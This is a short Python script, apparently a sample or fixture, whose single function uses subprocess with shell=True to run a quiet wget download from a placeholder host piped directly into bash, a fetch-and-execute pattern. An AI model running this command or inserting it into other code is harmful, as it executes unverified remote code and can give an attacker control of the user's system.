import subprocess


def main():
    subprocess.run("wget -qO- http://cdn.example.invalid/x | bash", shell=True, check=False)


if __name__ == "__main__":
    main()
